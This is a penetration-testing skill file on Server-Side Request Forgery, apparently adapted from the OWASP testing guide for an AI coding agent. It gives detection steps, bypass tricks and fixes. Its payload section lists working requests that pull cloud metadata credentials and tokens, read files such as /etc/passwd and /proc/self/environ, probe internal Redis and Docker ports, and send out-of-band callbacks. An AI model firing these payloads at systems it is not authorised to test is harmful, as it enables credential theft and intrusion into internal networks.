---
name: ssrf
description: >
  Server-Side Request Forgery (SSRF) occurs when user-controlled input is used to construct URLs that the server fetches, enabling access to internal services, cloud metadata endpoints (169.254.169.254), and local files via `file://` scheme. Detect via parameters accepting URLs or hostnames, PDF/report generators rendering `<iframe>/<img>/<script>`, and blind SSRF via out-of-band DNS callbacks. Bypass filters using IP decimal/octal/hex encoding, URL-userinfo tricks, and URL fragments. Tools: Burp Collaborator, curl.
license: MIT
compatibility: Designed for Claude Code. Requires Burp Suite with Collaborator, or interactsh/ngrok for OOB detection.
metadata:
  category: web
  version: "0.1"
  source: https://owasp.org/www-project-web-security-testing-guide/stable/
  source_types: framework
  wstg: WSTG-INPV-19
---

# Server-Side Request Forgery (SSRF)

## What Is Broken and Why
SSRF occurs when an application fetches a remote resource based on user-supplied input without adequate validation. The server makes the request on behalf of the attacker, bypassing network perimeter controls that would block the attacker's direct access. Common targets include internal admin panels (accessible only from localhost), cloud metadata services (AWS/GCP/Azure instance metadata), internal databases and APIs, and arbitrary files on the server filesystem via the `file://` scheme.

## Key Signals
- Parameters named `url`, `uri`, `path`, `redirect`, `link`, `src`, `href`, `fetch`, `load`, `resource`, `page`, `feed`, `callback`, `proxy`
- Application fetches external content on behalf of the user (URL previews, webhooks, file imports, image fetching)
- PDF/report generators that render HTML (often process `<img>`, `<iframe>`, `<link>` tags server-side)
- Webhook configurations accepting attacker-controlled URLs
- Import features (RSS feeds, remote files, API integrations)
- Blind SSRF: no visible response but out-of-band DNS/HTTP callbacks observed

## Methodology
1. Identify all parameters that accept URLs, hostnames, or IP addresses.
2. Submit your OOB callback URL (Burp Collaborator, interactsh) to detect blind SSRF.
3. Test for internal service access: `http://127.0.0.1/`, `http://localhost/admin`, `http://192.168.0.1/`
4. Test cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/`
5. Test file scheme: `file:///etc/passwd`, `file:///etc/hosts`, `file:///proc/self/environ`
6. For PDF generators: inject `<iframe src="http://169.254.169.254/">`, `<img src="file:///etc/passwd">`
7. Test bypass techniques if initial attempts are filtered.
8. Enumerate internal network: try common internal ranges and port ranges.
9. Chain with other vulnerabilities (e.g., SSRF → internal Redis → RCE).

## Payloads & Tools
```
# Direct internal access
TARGET/page?url=http://127.0.0.1/admin
TARGET/page?url=http://localhost:8080/internal
TARGET/page?url=http://192.168.1.1/

# Cloud metadata (AWS)
TARGET/page?url=http://169.254.169.254/latest/meta-data/
TARGET/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Cloud metadata (GCP)
TARGET/page?url=http://metadata.google.internal/computeMetadata/v1/
TARGET/page?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# File scheme
TARGET/page?url=file:///etc/passwd
TARGET/page?url=file:///etc/hosts
TARGET/page?url=file:///proc/self/environ
TARGET/page?url=file:///c:/windows/win.ini

# OOB blind SSRF detection
TARGET/page?url=http://VICTIM.burpcollaborator.net/ssrf-test
TARGET/page?url=http://VICTIM.interactsh.com/

# PDF generator injection (HTML payload in content field)
<iframe src="http://169.254.169.254/latest/meta-data/" width="500" height="500">
<img src="file:///etc/passwd">
<script src="http://169.254.169.254/"></script>

# IP filter bypass — alternate representations of 127.0.0.1
TARGET/page?url=http://2130706433/          # decimal
TARGET/page?url=http://017700000001/        # octal
TARGET/page?url=http://127.1/              # shorthand
TARGET/page?url=http://0x7f000001/         # hex

# URL parser confusion
TARGET/page?url=http://TARGET-DOMAIN@VICTIM-INTERNAL/path
TARGET/page?url=http://VICTIM-INTERNAL#TARGET-DOMAIN

# curl-based manual testing
curl -s "TARGET/fetch?url=http://127.0.0.1:6379/" -v   # Redis
curl -s "TARGET/fetch?url=http://127.0.0.1:27017/"      # MongoDB
curl -s "TARGET/fetch?url=http://127.0.0.1:2375/info"   # Docker daemon
```

## Bypass Techniques
- Decimal IP: `2130706433` = `127.0.0.1`
- Octal IP: `017700000001` = `127.0.0.1`
- Hex IP: `0x7f000001` = `127.0.0.1`
- IPv6 loopback: `http://[::1]/`
- Short IP: `127.1`, `127.0.1`
- URL userinfo abuse: `http://expected-domain@internal-host/` — parser uses `internal-host` as host
- Fragment abuse: `http://internal-host#expected-domain` — some validators check fragment
- URL-encode entire host portion
- Case variation: `HTTP://127.0.0.1`, `Http://localhost`
- DNS rebinding: domain initially resolves to allowed IP, then switches to internal IP after validation
- Redirect chain: supply allowed URL that 301-redirects to internal target
- Protocol confusion: `dict://`, `gopher://`, `ftp://`, `ldap://` if application uses generic URL fetcher

## Exploitation Scenarios
**Scenario 1 — AWS Metadata Credential Theft**
Setup: Image import feature fetches URL and stores image; no URL validation beyond HTTP/HTTPS scheme check.
Trigger: `TARGET/import?imageUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME`
Impact: AWS IAM temporary credentials returned in response; attacker accesses S3 buckets, EC2 APIs.

**Scenario 2 — Internal Admin Panel Access**
Setup: Webhook test feature sends HTTP request to user-supplied URL.
Trigger: `TARGET/webhook/test?url=http://127.0.0.1:8080/admin/users` — internal admin API returns user list.
Impact: Unauthenticated access to internal administrative functionality, user enumeration, potential account takeover.

**Scenario 3 — Blind SSRF via PDF Generator**
Setup: Invoice PDF generation renders HTML; no URL parameters visible but HTML content is user-supplied.
Trigger: Inject `<img src="http://VICTIM.interactsh.com/blind-ssrf">` into invoice address field.
Impact: OOB HTTP callback confirms SSRF; escalate to `file:///etc/passwd` in img src to read server files via PDF output.

## False Positives
- Application fetching URLs from a strictly maintained allowlist (verify allowlist can't be bypassed)
- SSRF to external URLs only where internal network is not reachable from server
- OOB callbacks from security scanners or crawlers already probing the application
- Redirect to internal host that returns only a generic error (not necessarily exploitable)

## Fix Patterns
- Allowlist permitted URL schemes (https only), hosts, and ports rather than blocklisting
- Resolve DNS and verify the resolved IP is not in RFC 1918 / loopback / link-local ranges before fetching
- Use a dedicated egress proxy or network segment that cannot reach internal services
- Disable unused URL schemes in HTTP client libraries
- Return opaque responses (don't reflect fetched content body to user) for non-critical fetch features
- Apply network-level controls: prevent web server from initiating connections to internal networks

## Related Skills

[[xxe]] and SSRF are deeply related: an XXE payload using an `http://` entity is a form of SSRF, and XXE can trigger SSRF to reach internal services or cloud metadata endpoints. [[http-request-smuggling]] can pivot into SSRF by using the smuggled prefix to reach internal back-end services that the front-end proxy would otherwise block. [[cors-misconfig]] exploits a similar trust boundary as SSRF — both let an attacker leverage the server's trusted network position. In mobile, [[mobile-network-security]] covers SSRF risks through mobile backend API misconfigurations.
